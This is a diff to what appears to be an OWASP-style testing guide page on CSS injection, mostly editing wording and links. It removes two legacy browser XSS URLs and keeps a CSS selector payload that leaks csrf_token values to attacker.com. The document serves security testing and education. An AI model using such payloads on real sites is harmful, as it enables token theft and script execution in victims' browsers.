@@ -6,7 +6,7 @@
 
 ## Summary
 
-A CSS Injection vulnerability involves the ability to inject arbitrary CSS code in the context of a trusted web site which is rendered inside a victim's browser. The impact of this type of vulnerability varies based on the supplied CSS payload. It may lead to cross site scripting or data exfiltration.
+A CSS Injection vulnerability involves the ability to inject arbitrary CSS code in the context of a trusted site which is rendered inside a victim's browser. The impact of this type of vulnerability varies based on the supplied CSS payload. It may lead to cross-site scripting or data exfiltration.
 
 This vulnerability occurs when the application allows user-supplied CSS to interfere with the application's legitimate style sheets. Injecting code in the CSS context may provide an attacker with the ability to execute JavaScript in certain conditions, or to extract sensitive values using CSS selectors and functions able to generate HTTP requests. Generally, allowing users the ability to customize pages by supplying custom CSS files is a considerable risk.
 
@@ -21,10 +21,9 @@ The following JavaScript code shows a possible vulnerable script in which the at
 </script>
 ```
 
-The attacker could target the victim by asking them to visit the following URLs:
+> **Note:**
 
-- `www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current;` (Opera \[8,12\])
-- `www.victim.com/#red;-:expression(alert(URL=1));` (IE 7/8)
+ Some CSS-based JavaScript execution techniques rely on legacy browser behavior (e.g., older versions of IE and Opera). While modern browsers mitigate most of these vectors, CSS injection can still enable data exfiltration, UI manipulation, and attack chaining.
 
 The same vulnerability may appear in the case of reflected XSS, for example, in the following PHP code:
 
@@ -44,7 +43,7 @@ Here is an example of code that attempts to select an input with a `name` matchi
 ```html
 <style>
 input[name=csrf_token][value=^a] {
-    background-image: url(http://attacker.com/log?a);
+    background-image: url(https://attacker.com/log?a);
 }
 </style>
 ```
@@ -58,7 +57,7 @@ Other attacks using solicited content such as CSS are highlighted in [Mario Heid
 
 ## How to Test
 
-Code should be analyzed to determine if a user is permitted to inject content in the CSS context. Particularly, the way in which the website returns CSS rules on the basis of the inputs should be inspected.
+Code should be analyzed to determine if a user is permitted to inject content in the CSS context. Particularly, the way in which the site returns CSS rules on the basis of the inputs should be inspected.
 
 The following is a basic example:
 
@@ -76,8 +75,7 @@ The above code contains a source `location.hash`, controlled by the attacker, th
 
 The following pages provide examples of CSS injection vulnerabilities:
 
-- [Password "cracker" via CSS and HTML5](http://html5sec.org/invalid/?length=25)
-- [CSS attribute reading](http://eaea.sirdarckcat.net/cssar/v2/)
+- [Password "cracker" via CSS and HTML5](https://html5sec.org/invalid/?length=25)
 - [JavaScript based attacks using `CSSStyleDeclaration` with unescaped input](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)
 
 For further OWASP resources on preventing CSS injection, see the [Securing Cascading Style Sheets Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html).
